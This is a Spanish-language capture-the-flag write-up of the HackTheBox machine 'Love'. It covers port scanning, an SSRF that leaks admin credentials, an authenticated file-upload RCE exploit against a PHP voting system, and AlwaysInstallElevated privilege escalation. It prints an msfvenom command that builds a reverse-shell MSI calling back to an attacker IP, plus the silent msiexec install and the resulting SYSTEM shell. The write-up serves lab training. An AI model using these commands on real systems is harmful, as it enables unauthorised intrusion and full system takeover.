---
title: "Love - HTB Writeup"
layout: single
excerpt: "Love es una máquina de nivel fácil de HackTheBox. En esta máquina explotamos un SSRF y hacemos uso de un exploit para obtener acceso a la máquina. Hacemos uso del permiso habilitado AlwaysInstallElevated para escalar privilegios a través de un paquete de instalación malicioso."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/128861426-4547e230-648f-4f8b-a440-c321b5cde9d8.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - SSRF
  - RCE
  - AlwaysInstallElevated
---

![titulo](https://user-images.githubusercontent.com/67548295/128862771-30d57757-e49d-46a1-857c-fbe6f2d0e447.png)

# Enumeración

Como siempre, empezamos enviando una traza ICMP a la máquina víctima, con esto lo que hacemos es comprobar que la máquina está activa y averiguar el OS:

```bash
└──╼ $ping -c 1 10.10.10.239
PING 10.10.10.239 (10.10.10.239) 56(84) bytes of data.
64 bytes from 10.10.10.239: icmp_seq=1 ttl=127 time=71.8 ms

--- 10.10.10.239 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 71.771/71.771/71.771/0.000 ms
```

| Parámetro | Acción |
|:----------|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Podemos observar que la máquina está activa y que observando el TTL, concluimos que es una máquina Windows.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/).

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier).

## Nmap

Empezamos con la fase de escaneo de puertos, esta fase la haré haciendo uso de la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -v -n 10.10.10.239 -sV -sC -oN targeted
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 Win64 OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:   d35a 2ba6 8ef4 7568 f99d d6f4 aaa2 03b5
|_SHA-1: 84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
|_ssl-date: 2021-08-10T12:26:01+00:00; +21m33s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI http2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m33s, deviation: 3h30m01s, median: 21m32s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-10T05:25:47-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-10T12:25:50
|_  start_date: N/A
```
| Parámetro | Acción |
|:----------|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535 |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto |
| `--min-rate [valor]` | envia paquetes tan o más rápido que la tasa dada |
| `-v` | Especifica que queremos más 'verbose', es decir, que nos muestre mas información de la convencional |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo |

Vemos que hay varios puertos, entre ellos destacamos los más relevantes:

| Puerto | servicio |
|:------:|:--------:|
| 80 | HTTP |
| 135 | RPC |
| 139 | NetBIOS session service |
| 433 | HTTPS |
| 445 | SMB |
| 3306 | MySQL |
| 5000 | HTTP |
| 5985 & 5986 | winRM y winRM over SSL |

Vemos tambien que se ha encontrado un subdominio analizando el puerto 443: staging.love.htb

# User.txt

Lo primero que hago es añadir al /etc/hosts el dominio love.htb y stanging.love.htb

Y enumeramos el servicio HTTP.

Accedo desde el navegador y encuentro esto:

![navegador1](https://user-images.githubusercontent.com/67548295/128874818-d946bc34-79a1-46ea-b8a4-29382d3b3ad0.png)

Parece ser un sistema de votación.

Accedo al subdominio encontrado por `nmap` para ver que hay:

![navegador2](https://user-images.githubusercontent.com/67548295/128881131-bbe0333c-7743-4ced-9222-bd9bcd728c4f.png)

Y hay otro servicio completamente diferente al anterior.

Vemos lo que parece ser un escaner de archivos para detectar malware.

Me llama la atención el apartado de arriba con nombre _Demo_

Accedo al recurso y veo que puedo indicar una ruta para escanear un archivo.

Intente ejecutar diferentes técnicas de explotación como [LFI](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/), [RFI](https://wiki.elhacker.net/bugs-y-exploits/nivel-web/rfi), etc. Pero ninguna funcionó.

Hasta que probe a hacer un [SSRF](https://blog.hackmetrix.com/ssrf-server-side-request-forgery/) y dió resultados:

![navegador3](https://user-images.githubusercontent.com/67548295/128903247-d17e8e76-7127-4c85-83a3-a2203b8b9f25.png)

He accedido al recurso que habiamos visto por primera vez mediante este SSRF.

---

Sigamos enumerando.

Enumero el puerto 5000 que habiamos visto en la captura de nmap, pero obtengo un forbidden:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -s http://10.10.10.239:5000 | html2text
****** Forbidden ******
You don't have permission to access this resource.
===============================================================================
     Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 Server at
     10.10.10.239 Port 5000
```

Al ver esto se que no tengo acceso a este recurso, pero, ¿y si intento acceder a este recurso desde el SSRF?

Lo pruebo y consigo acceder:

![navegador4](https://user-images.githubusercontent.com/67548295/128906122-ef2daf9b-8e1e-452e-84df-399f43dc9ab3.png)

¡Y me dan una credenciales en texto claro!

Las pruebo en en el panel de sesion que habiamos visto al principio, pero no funciona:

![navegador5](https://user-images.githubusercontent.com/67548295/128906668-acab2665-53fa-408c-b4b4-d848e27b2d9b.png)

Tras desconcertarme un poco, fuzzeo en busca de directorios para ver si encuentro otro panel de inicio de sesion o algo similar: 

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $gobuster dir -u "http://10.10.10.239/" -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -t 50 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColo
nial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.239/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/10 18:30:22 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
/Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/] 
/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
Progress: 1176 / 220547 (0.53%)
```

Un directorio admin!!

Navego hasta el recurso y me encuentro con un panel de inicio de sesión para administradores:

![navegador6](https://user-images.githubusercontent.com/67548295/128907352-eab93537-f3b8-4e0b-8c67-d6811bca9e0e.png)

Es bastante similar al de antes pero ahora pide usuario y contraseña en lugar de id y password.

Pruebo las credenciales aqui y gano acceso a un panel de administración:

![navegador7](https://user-images.githubusercontent.com/67548295/128907857-ca42e752-a97e-495c-9019-f41062751af3.png)

Aquí estuve un tiempo atascado, probando multiples maneras de ganar acceso al sistema, hasta que se me ocurrio buscar exploits por el nombre del panel

Con la ayuda de la herramienta `searchsploit` busque exploits de voting system:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $searchsploit voting system
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                                                                                             | php/webapps/43967.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                                                                         | multiple/webapps/49159.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                | php/webapps/49445.py
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Y veo un exploit potencial a probar que nos permite ejecutar comandos en el sistema victima.

Lo descargo y edito unos parámetros para adecuarlos a nuestro objetivo:

![navegador9](https://user-images.githubusercontent.com/67548295/128910210-f3f91bea-9645-4810-b517-6e5663a8ba6e.png)

Una vez hecho esto, me pongo en escucha con netcat por el puerto dado y ejecuto el exploit:

![navegador10](https://user-images.githubusercontent.com/67548295/128910734-8f2043a1-c5b2-416d-9967-4776a682b830.png)

Y ganamos acceso al sistema!

La flag se encuentra en C:\Users\Phoebe\Desktop\user.txt:

```bash
C:\Users\Phoebe\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

04/13/2021  03:20 AM    <DIR>          .
04/13/2021  03:20 AM    <DIR>          ..
08/10/2021  04:30 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,045,840,384 bytes free

C:\Users\Phoebe\Desktop>type user.txt
type user.txt
aXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2e
```
# Root.txt

Empiezo enumerando el sistema con winPEAS y me encuentro con un vector para escalar privilegios:

![navegador11](https://user-images.githubusercontent.com/67548295/128912006-96ab58d2-0650-46ba-ac43-46fb15df5aba.png)

Tenemos habilitado el AlwaysInstallElevated que hace que cualquier paquete de instalacion que instalemos, se haga como administrador, esto es crítico

ya que podemos crear un paquete de instalación malicioso con `msfvenom` para ganar acceso como administrador.

Hagamos eso, primero creamos el paquete con `msfvenom`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o laZeroShell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Saved as: laZeroShell.msi
```
ahora lo transferimos a la máquina y lo intalamos con msiexec mientras estamos en escucha:

```bash
msiexec /quiet /qn /i laZeroShell.msi

C:\Users\Phoebe\Desktop>
```

* **/quiet**: silencia cualquier mensaje durante la instalación
* **/qn**: sin interfaz gráfica
* **/i**: opción de instalación del paquete

Una vez hecho este comando mientras previamente estabamos en escucha con netcat, comprobamos y obtenemos una shell:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.239 64361
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
whoami
nt authority\system
```

Y listo señores, a partir de aqui podriamos ver la flag de root en C:\Users\Admnistrator\Desktop\root.txt:

```bash
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\root.txt

b85553d0fXXXXXXXXXXXXXXXXXXXXXXXXXXXX71

```

# Resumen

Hemos explotado una vulnerabilidad de tipo SSRF para acceder a un recurso no accesible desde fuera, ahí hemos encontrado unas credenciales que hemos utilizado para 
acceder al panel de administración del sistema de votación, ya estando aquí, utilizamos un exploit para poder conseguir ejecución remota de comandos con la que nos hemos metido
al sistema, por último nos hemos aprovechado de un registro que nos permitía instalar paquetes como administrador para conseguir escalar privilegios.
